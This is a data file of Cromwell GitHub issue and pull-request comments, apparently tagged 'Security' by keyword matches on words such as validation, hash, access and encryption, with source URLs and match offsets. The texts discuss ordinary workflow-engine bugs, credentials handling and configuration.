Security,"The following wdl validates and starts ""running"" even though nothing can happen:. ```; workflow CromwellSimpleCircularGraphBug {; 	; 		call Echo as A {input: string = item1}; 		String item2=A.out; ; 		call Echo as B{input: string = item2}; 		String item1=B.out; }. task Echo {; 	String string; 	command {; 		echo ${string}; 	}; 	runtime {; docker: ""ubuntu:latest""; 	}; 	output {; 		String out=read_string(stdout()); 	}; }; ```. This version is a bit trickier, perhaps. It also is ""running"":; ```; workflow CromwellCircularGraphWithScatterBug {; 	; scatter(item1 in list1) {; 		call Echo as A {input: string = item1}; 		String list2=A.out; }. scatter(item2 in list2) {; 		call Echo as B{input: string = item2}; 		String list1=B.out; } ; }. task Echo {; 	String string; 	command {; 		echo ${string}; 	}; 	runtime {; docker: ""ubuntu:latest""; 	}; 	output {; 		String out=read_string(stdout()); 	}; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2279:18,validat,validates,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2279,1,['validat'],['validates']
Security,The former. He was looking for a backend-aware validation type behavior,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459:47,validat,validation,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231627459,1,['validat'],['validation']
Security,"The functionality provided in this PR would be helpful to one of our users and I would love to see it merged, but this PR has languished for over 2 years. Looking it over, I have 3 questions for @illusional which may effect getting this merged:. 1. Would it make sense to change the proposed option from skipping the lookup entirely, to allowing the lookup to happen, but ignore the failure if we have a hash?; 2. Would having tests for this change make it more palatable to the maintainers?; 3. Maybe redo the PR against the current state of the repo so that there are not 2 years worth of conflicts to resolve before a merge?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438:404,hash,hash,404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438,1,['hash'],['hash']
Security,"The gist is:. The `ioActor` that is already wired through from the CromwellRoot into the system has been swapped for an `IoActorEndpoint`. This endpoint just forwards existing requests to the IoActor so nothing changes on that side. The only difference is it forwards `IoCommandWithPromise` requests to a proxy actor that will communicate with the IoActor and complete the promise when the answer comes back, thus providing a globally accessible (even outside of an actor) `Future`-like interface that performs operations through the I/O actor.; This is then used in the IoFunctionSet to add retries, throttling and GCS optimizations to it.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3091:435,access,accessible,435,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3091,1,['access'],['accessible']
Security,The hash failures are expected with http inputs and should not be the cause of your workflow failure. Also we don't currently support `http` in engine filesystems. Do you see any other error messages than might provide some insight into what's happening?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425981166:4,hash,hash,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4184#issuecomment-425981166,1,['hash'],['hash']
Security,The how is still TBD but the end result is the query endpoint shall only return results for workflows the user has access to,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2138:115,access,access,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2138,1,['access'],['access']
Security,The impact is on all workflows not just sub. The issue is that in a multi-backend world supporting different filesystems or authentication mechanisms it is likely that the current implementation of workflow outputs copying would break.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1684#issuecomment-326406438:124,authenticat,authentication,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1684#issuecomment-326406438,1,['authenticat'],['authentication']
Security,"The large ""lines changed"" values are inflated by moving one long list of lines around, and adding test cases. Brief explanation:; - Most tests in our CI have metadata expectations. We keep polling the rest API until the metadata we get back matches our expectation.; - However, it's possible for extra values we aren't validating against to trickle in even after we validate it successfully.; - Our tests check ""job manager style metadata requests"" by re-polling the rest API, and making sure what we get back is only the fields we ask for, but otherwise exactly the same as the original poll.; - The primary change here is allowing values to trickle into fields which JM asks for and which weren't included in our original metadata validation. We should no longer be failing tests just because some extra metadata has arrived in a field and Cromwell has correctly returned it to us. Note: Also makes those long obnoxious JSON diffs very slightly less obnoxious.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6467:319,validat,validating,319,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6467,3,['validat'],"['validate', 'validating', 'validation']"
Security,The log output is designed for informational and debugging purposes only. The truncation is intentional because excessively large logs can destabilize production servers running 1000s of workflows. The supported mechanism for accessing output information is via the web API: https://cromwell.readthedocs.io/en/stable/api/RESTAPI/#get-the-outputs-for-a-workflow,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686:226,access,accessing,226,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6209#issuecomment-794326686,1,['access'],['accessing']
Security,"The original title of this ticket turned out to be incorrect, the actual problem was needless `hashCode` computation when `Scope`s were put in `Set`s or used as `Map` keys. Thanks to @kshakir for pointing out that Scala should generate case class `equals` correctly and shouldn't have the problem I had claimed. 😄 . PR forthcoming for the `hashCode` issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1457#issuecomment-248741884:95,hash,hashCode,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1457#issuecomment-248741884,2,['hash'],['hashCode']
Security,"The purpose of this PR is to provide ARN validation from [this](https://github.com/broadinstitute/cromwell/blob/88ba33918fd762599d8fd2e2c3d142a04ad5d2fb/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchRuntimeAttributes.scala#L159) TODO.; I added the validation of any ARN in a general form as stated in the TODO.; However, since the final regex turned out to be too vague, I also added validation for queue ARNs.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5170:41,validat,validation,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5170,3,['validat'],['validation']
Security,"The release WDL relies on a GitHub access token for some of its operations and ""environmental"" auth for others. Trying to run the release WDL in an environment that does not have an account auth'd that can `git push` to the `broadinstitute/cromwell` repository will end badly. Ideally all GitHub operations in the release WDL should use the access token.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4870:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4870,2,['access'],['access']
Security,"The resolution of #2035 exposed this issue. A centaur issue was mitigated by https://github.com/broadinstitute/centaur/pull/165. A proper fix in the [StandardBackend](https://github.com/broadinstitute/cromwell/blob/335e9838abce1405f0d26fe18c5dba2dfa7ad0f5/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L173) will enable a centaur test to run a task with command:. ```; command {; echo ""hello"" > tmp; }; ```. This regression centaur test should run on all backends.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2047:24,expose,exposed,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2047,1,['expose'],['exposed']
Security,The role granted to the EC2 that runs the Cromwell server would need to grant access to the bucket that you have specified in the outputs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-602899024:78,access,access,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-602899024,1,['access'],['access']
Security,"The test `cromwell.backend.standard.callcaching.StandardFileHashingActorSpec` has a failing test that asserts ""send a timeout to the ioActor the command doesn't hash"". It intermittently fails when run, suggesting a race condition may exist",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2816:161,hash,hash,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2816,1,['hash'],['hash']
Security,"The unprocessed workflow options json is being stored in the database without being passed through our encryption code. The ""cleared"" workflow options should be stored in metadata, and the encrypted version stored during the workflow run in the workflow store. The workflow store will continue to be emptied once the workflow finishes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1638:103,encrypt,encryption,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1638,2,['encrypt'],"['encrypted', 'encryption']"
Security,"The urgency of this particular fix came as we starting adding more valid CWL to PAPI and the tests were creeping past 70 minutes. I'm open to parallelizing local too. The workflow is reusable and there's currently nothing technically stopping us from switching local to parallel also. Cromwell's ""randomization"" (aka internally using unordered sets/hashmaps) when launching scatter jobs makes debugging the entire suite of tests wicked painful. It's hard to tell when a failure occurs what test was running. While CWL is in a state of flux I kind of like slowly working my way through the serial logs of local-conformance when I break something. My 2¢/ToL",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3187#issuecomment-360253011:349,hash,hashmaps,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3187#issuecomment-360253011,1,['hash'],['hashmaps']
Security,"The use case in Cromwell is the same as FireCloud - Cromwell now will use cached data if it exists, and not if it doesn't, but you can't tell why it wasn't in cache when you expected it to be. People could do forensics themselves, but if we had this stored and accessible you could quickly see ""the docker image changed"" or ""the file changed"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583:261,access,accessible,261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256488583,1,['access'],['accessible']
Security,"The valid WDL file below fails to compile. ```wdl; workflow x {; call cram; call y { input:; cram = cram.cram; }; }. task cram {; command {; echo "".""; }; output {; String cram = "".""; }; }. task y {; String cram; command {; echo "".""; }; }; ```. Running it with Cromwell version 32 gives:. ```; Workflow input processing failed:; ERROR: Bad target for member access 'cram.cram': 'cram' was a String (line 4, col 33):. cram = cram.cram; ^; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3811:357,access,access,357,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3811,1,['access'],['access']
Security,"The way this works for now is:; In JES configuration you need to specify an `authenticationMode` parameter which can take one of those 2 values: `service_account` or `refresh_token`; `service_account` works exactly the same way as it did before; `refresh_token` will require 2 fields to be passed as workflow options:; `account_name` and `refresh_token`. Depending on what is available, the JES backend will create, only if necessary and at workflow initialization time, a json file (gcloudauth.json) and upload it to the root directory of the workflow.; Currently this json file can contain 2 types of information:; - Docker credentials: These are optional and can be specified in the `jes` section in application.conf. They look like this:. ```; dockerAccount = ""my.docker@account.com""; dockerToken = ""mydockertoken""; ```. If they are specified a ""docker"" value will be added to gcloudauth.json containing those values.; This will allow using a private docker image that would not be accessible otherwise.; This functionality was mostly already there from Kristian PR, I just moved the credential location from gcs to conf.; - User credentials: These need to be added as workflow options : . ```; {; ""account_name"": ""myaccount@broadinstitute.org"",; ""refresh_token"": ""refresh_token""; }; ```. Again if in RefreshToken mode, they need to be there for every workflow call or an exception will be thrown at initialization time.; If they are there they will be added to the gcloudauth.json in the same way docker crednetials are, under a ""gcloud"" value. You should then get permission to localize input files that are only accessible to this user. So depending on what is provided (docker info, user info), you can get a gcloudauth.json with both credentials, only one, or no file at all. In any case the JES backend will try to delete this file when the workflow reaches a terminal state.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/190:77,authenticat,authenticationMode,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/190,3,"['access', 'authenticat']","['accessible', 'authenticationMode']"
Security,The workflow; ```; version 1.0. workflow member_access {; Object myObj = object { an_int: 5 }; if (myObj.an_int == 10) {; Boolean asdf = true; }; }; ```; fails to validate with error; ```; Failed to create wom Graph (reason 1 of 1):; Failed to process workflow definition 'member_access' (reason 1 of 1):; Invalid type for condition variable: Any; ```; It appears that the type checker is not correctly evaluating the type of values reached via member access.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3790:163,validat,validate,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3790,2,"['access', 'validat']","['access', 'validate']"
Security,"The workflow; ```; version 1.0. workflow scatter_chain {; Array[Pair[Int, Int]] pairs = [(1, 2), (3, 4), (5, 6)]; scatter (p in pairs) {; Int x = p.left; }; }; ```; used to fail WOM validation because expressions consisting of member access on the scatter variable were erroneously counted as being consumed within the scatter's inner graph. This PR stops this misaccounting. ( On Friday @cjllanwarne and I hypothesized that `ifElementUnlinkedValueConsumer` would need a similar adjustment, but I no longer think this is the case; an `IfElement` does not create a new variable in the scope of its graph like a `ScatterElement` does. )",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3763:182,validat,validation,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3763,2,"['access', 'validat']","['access', 'validation']"
Security,"There are a few development activities that are blocked by needing Jeff's computer. It has something to with the encryption of a configuration something something... more to be filled in by Jeff. . @geoffjentry I would really like you to work on unblocking this when you have your work computer back. If there's anything across other teams or BITs etc that you need, just say the word.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2442:113,encrypt,encryption,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2442,1,['encrypt'],['encryption']
Security,"There are at least four spots in `WorkflowExecutionActor` where `==` is invoked on `Scope`s. This is not so good as `==` in Scala does a deep equals, and the `Scope` implementations are case classes with compiler-generated `equals` and `hashCode` implementations. These implementations invoke `equals`/`hashCode` on their constructor fields, including `Task` which contains a lot of hairy stuff including ASTs. This is extra bad in `WorkflowExecutionActor` since these `==`s are invoked synchronously with message processing to update the execution store, and all this computation is effectively single-threaded within a workflow. In practice, for a 20K wide scatter this causes the `WorkflowExecutionActor` to spend upwards of 20 minutes from the time work finishes in (mock) JES to actually succeeding the workflow. I _think_ this might be fixed by chasing down all the spots where `==` is used on `Scope`s and replacing that with call FQN + index + attempt comparisons instead.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1457:237,hash,hashCode,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1457,2,['hash'],['hashCode']
Security,"There hasn't unfortunately. This is sort of a desperate thought but maybe you can try to see if you can cache via file path instead of file hash (https://cromwell.readthedocs.io/en/develop/Configuring/#local-filesystem-options). I don't know if its configured to work for AWS but ""hashing-strategy"" could be set to path -- though it may only ever work for the local filesystem and not S3. ```; # Possible values: file, path, path+modtime; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; # ""path+modtime"" will compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here.; # Default: file; hashing-strategy: ""file""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065:140,hash,hash,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-581915065,7,['hash'],"['hash', 'hashed', 'hashing-strategy']"
Security,There is a jes-specific docker compose file that includes hooks for authentication. We probably need the same thing for the AWS backend.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3287:68,authenticat,authentication,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3287,1,['authenticat'],['authentication']
Security,"There is no directory for shard-6. That's why the workflow agent can't read the RC file. The time-stamps for the files referenced in the job parameter json, however, reflect the time that the job was re-executed. This is probably the most troubling aspect for us as it suggests that data integrity for previous samples cannot be guaranteed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-496509163:288,integrity,integrity,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-496509163,1,['integrity'],['integrity']
Security,There's an intention to add parentWorkflowId (or rootWorkflowId) to the metadata summary table which should allow us to query for it faster. I don't see any reason we couldn't also expose it in the `/query` result set too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-467456003:181,expose,expose,181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4667#issuecomment-467456003,1,['expose'],['expose']
Security,"There's another concern here that PAPIv2 doesn't ([currently](https://groups.google.com/forum/#!topic/google-genomics-discuss/newaE3R-cwY)) terminate background containers nicely once all non-background actions terminate. I.e. it uses SIGKILL, which cannot be caught in our monitoring container, and hence so far it has not been able to report the last timepoint. However, to work around that I'll add one more action, which will be _non-background_, and will run after the user action. This 2nd action will be assigned to the same `pidNamespace` as the monitoring action (which possible with PAPIv2), and hence will have access to the PID of the monitoring action and will then kill it ""nicely"" with SIGTERM, and wait for it to terminate - something like this: `killall python && wait`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-452087901:622,access,access,622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-452087901,1,['access'],['access']
Security,"These changes are primarily focused on getting as much code into Standard as possible. Getting JES and SFS perfect wasn't a goal here though. There's a lot more work that could be done to tighten up each of those backends. Regarding JES/GCSFS: the proxy classes, that inject the custom file system providers, could likely be merged with `GcsPath`. I also have my eye on further cleaning up a lot of the path mapping, someday. For example JES calls something like `callRoot.resolve(path.stripPrefix(""/""))` in two different classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1930#issuecomment-276229649:268,inject,inject,268,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1930#issuecomment-276229649,1,['inject'],['inject']
Security,"These removed calls to `setAccessible` are NOT technically illegal yet. They do not modify [JDK classes](https://openjdk.java.net/jeps/396) and the third-party libraries that are modified at runtime are currently weakly encapsulated. Still, if these libraries suddenly switch to modules then [`setAccessible` will then be illegal](https://docs.oracle.com/javase/9/docs/api/java/lang/reflect/AccessibleObject.html#setAccessible-boolean-). This PR uses alternatives for some of the calls to `setAccesible` in this repo, either through basic refactoring or using new APIs that weren't available back when the original workaround was implemented.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996:391,Access,AccessibleObject,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6663#issuecomment-1024960996,1,['Access'],['AccessibleObject']
Security,"They'll look like the two tags currently in https://hub.docker.com/r/broadinstitute/cromwell/tags/ that are:; - `23-0c25192`; - `23`. Note to future viewers: I'll be deleting the git hashed tag, but 23 should re-appear when 23 is actually released.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1668#issuecomment-261033017:183,hash,hashed,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1668#issuecomment-261033017,1,['hash'],['hashed']
Security,"This PR addresses two bugs from WX-1260:; 1. An `echo` command that included asterisks wasn't wrapped in double quotes, causing an issue in some environments (the user's) but not others (the developer's). Added double quotes so this issue occurs in no environments. 2. The Script Preamble that exports the SAS token environment variable was running in a bash subshell, which means that the environment variable it populated wasn't available in the user's parent shell that is actually executing the task.; - To fix this, I added the option for script preambles to be executed in a bash subshell, or not. My thinking:; - It's generally good hygiene for scripts to run in their own subshell, and I didn't want to change anything about the GCP behavior, so I left that functionality as is.; - I didn't want to write a sas token to file in the subshell for the parent shell to read. Writing tokens to file seems not great for security.; - In order for the environment variable to be visible to the user command, I allowed the TES script to run in the parent shell. This bug revealed a gap in my testing: I had been confirming that my script could acquire the token successfully and correctly, but I hadn't actually tried to use that token inside the user command block. The concept of subshells eluded me at the time. After making this change, I've confirmed that the environment variable is indeed useable in the command block.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7326:922,secur,security,922,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7326,1,['secur'],['security']
Security,This PR adds an optional flag `-l` or `--list-dependencies` for command `validate` to list the imported files in the workflow and their subworkflows.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5073:73,validat,validate,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5073,1,['validat'],['validate']
Security,This PR adds an optional flag `-l` or` --list-dependencies` for command `validate` to list the imported files in the workflow and their subworkflows. JIRA ticket: [here](https://broadworkbench.atlassian.net/browse/BA-3501),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5098:73,validat,validate,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5098,1,['validat'],['validate']
Security,This PR cherry picks the below features/functionalities from Cromwell 37 onto 36_hotfix:. - Statsd logging in CromIAM [link](https://github.com/broadinstitute/cromwell/pull/4293); - Call cache copy fail blacklisting [link](https://github.com/broadinstitute/cromwell/pull/4359); - Forbidden failures are recognized/treated as IO Failures [link](https://github.com/broadinstitute/cromwell/pull/4376); - Auto-sizing boot disk in PAPI v2 [link](https://github.com/broadinstitute/cromwell/pull/4472); - Allow for a 'name-for-call-caching-purposes' to override the backend name [link](https://github.com/broadinstitute/cromwell/pull/4490); - User-service-account auth for Pipelines API v2 [link](https://github.com/broadinstitute/cromwell/pull/4566); - Add the Token Queue info to Cromwell log [link](https://github.com/broadinstitute/cromwell/pull/4567); - Labels query performance update [link](https://github.com/broadinstitute/cromwell/pull/4610); - Workflow validation for labels PATCH goes to summary not metadata [link](https://github.com/broadinstitute/cromwell/pull/4617); - CI Updates [link](https://github.com/broadinstitute/cromwell/commit/1a739fc7aabb1c557d96b57944c50ddc2006236a),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4675:957,validat,validation,957,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4675,1,['validat'],['validation']
Security,"This PR includes the majority of the work required to implement the [Struct Literal Syntax of WDL 1.1 ](https://github.com/openwdl/wdl/blob/main/versions/1.1/SPEC.md#struct-literals). At a high level, we can now parse the new syntax, and turn that into a value that can be validated & used. This PR _does not_ include the strict type checking defined in the spec. Since that will require some small tweaks to the linking step (and for the sake of the reviewers), I figure it's better to do that in a subsequent PR. In practice, this means that errors aren't thrown in certain situations where you would expect them to be thrown. Examples:. ```; struct MyStructType {; Int myIntMember; String? myStringMember; }. // the new syntax; MyStructType a = MyStructType{myIntMember: 4, myStringMember: ""Hi!""}. // still works just like any old struct value; MyStructType b = a. // note that omission of optional members is allowed by the spec; MyStructType c = MyStructType{myIntMember: 3}. // Literals are values; Int someInt = (MyStructType{myIntMember: 5, myStringType: ""Bye!""}).myIntMember. // As of this PR, this will not throw an error (but it technically should); Boolean illegalBool = (MyStructType{myIntMember: 5, myStringType: ""Bye!"", iMadeUpThisBool: false}).iMadeUpThisBool; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7391:273,validat,validated,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7391,1,['validat'],['validated']
Security,"This PR:; * Removes unused code and tests around filesystem token expiration; * Adds more tests of the new filesystem expiration logic; * Changes `AzureFilesystem` such that when its credential has no expiration, it is NEVER expired rather than ALWAYS expired; * Applies the fallback-to-public-creds behavior to native Azure access as well as WSM-mediated access",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7216:325,access,access,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7216,2,['access'],['access']
Security,"This WDL validates and even executes ""successfully"" but it shouldn't:. ```; task hello {; command {; #nothing; }; output {; String out = ""out""; }; }. task bye {; String instring = ""bye""; command {; echo ${instring}; }; output {; String out = read_string(stdout()); }; }. workflow w {; call hello; call bye { input: instring = hello }; }; ```. `call bye { input: instring = hello }` is invalid",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2394:9,validat,validates,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2394,1,['validat'],['validates']
Security,This adds 3step to the list of tests run by centaur. Running this test exposed a regression that is fixed in this PR. Unfortunately 1st-workflow is not suitable as it expects a file input but is added here anyway with the potential of running a modified version.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2843:71,expose,exposed,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2843,1,['expose'],['exposed']
Security,This broke because the stored blob hash doesn't match our hashing algorithm when reading a file in an engine function.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7209:35,hash,hash,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7209,2,['hash'],"['hash', 'hashing']"
Security,"This change adds Trivy security scan for the Docker image, as discussed in the Workbench Cross-Team meeting. The action will run on every PR and give you feedback if the Docker image contains critical OS vulnerabilities. More info:; https://github.com/broadinstitute/dsp-appsec-trivy-action; https://github.com/broadinstitute/dsp-appsec-blessed-images",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6147:23,secur,security,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6147,1,['secur'],['security']
Security,"This change adds source code line number information to the WOM structures. It works for WDL, but not for CWL. The overall approach is to add a `LexicalInformation` structure to the top level wom package, and pass this information from Hermes, to the *wdlom*, and then *wom*. Here is a glossary of the changes made for the WDL draft3 case. ; ; `wdl.transforms.base.ast2wdlom.GenericAst`; Definition of the AST we get as a result of running Hermes. This is what a workflow starts as. `LexicalInformation`; Defined in wom.LexicalInformation. `model.draft3.elements.WorkflowDefinitionElement`; The wdlom definition for a workflow. has lexical information structure. `wom.callable.WorkflowDefinition`; The WOM definition for a workflow. Added a lexInfo field. `wdl.transforms.base.ast2wdlom.AstToWorkflowDefinitionElement`; conversion from; `wdl.transforms.base.ast2wdlom.GenericAst` (which is supposed to have been generated from a WDL workflow) to ; `model.draft3.elements.WorkflowDefinitionElement`. `wdl.transforms.base.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition`; conversion from; `model.draft3.elements.WorkflowDefinitionElement`; to; `wom.callable.WorkflowDefinition`. Compilation and testing were done on projects `wdlTransformsBiscayne, wdlTransformsDraft2, wdlTransformsDraft3, wom, womtool`. The top level tests, from the root project, require various initialization files that I don't have access to.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4938:1414,access,access,1414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4938,1,['access'],['access']
Security,"This change comes with a related change to vault to add a value. This has been added to dev as:. ""workflow_options_encryption_key"": ""nottheactualvalue"". but devops needs to to generate the encryption key for staging/alpha/prod and add these to vault before this version is promoted to those environments ( @abaumann @mmonnar )",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/377:189,encrypt,encryption,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/377,1,['encrypt'],['encryption']
Security,"This change enables blob filesystems to be opened that do not belong to the workspace, including public containers, and containers the requesting user has access to via WSM. This involves frequent 'refreshing' of the stored open filesystem in the underlying NIO implementation. To minimize the number of redundant requests to WSM, the SAS token for each open filesystem is stored and checked for expiration before attempting to reopen a previously open filesystem.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7140:155,access,access,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7140,1,['access'],['access']
Security,"This change set adds support for inputs in the [NCBI SRA](https://www.ncbi.nlm.nih.gov/sra) via [fusera](https://github.com/mitre/fusera). A user has to provide their NGC authentication file and a fusera Docker image in their configuration file like so:. ```; filesystems {; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""<some hosted docker path>/fusera:latest""; ngc = ""bmNiaV9nYXAfiwgAAAAAAAADBcHBDYQgEADAv1XQAGYXcfErUe5x0diCiFESA0Y8/VD8zTzrlXwMDEsoII9usPT5znZSmTqUohaSg5Gay14TbxsluMGOSBuqDEKefvbwCzv3BAAKoexb5uIbjjg7dq/p9mH7A5VTImxjAAAA""; }; }; ```. The `ngc` parameter must contain the base64-encoded NGC credential file. The one provided here is an example from the NCBI site.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3950:171,authenticat,authentication,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3950,1,['authenticat'],['authentication']
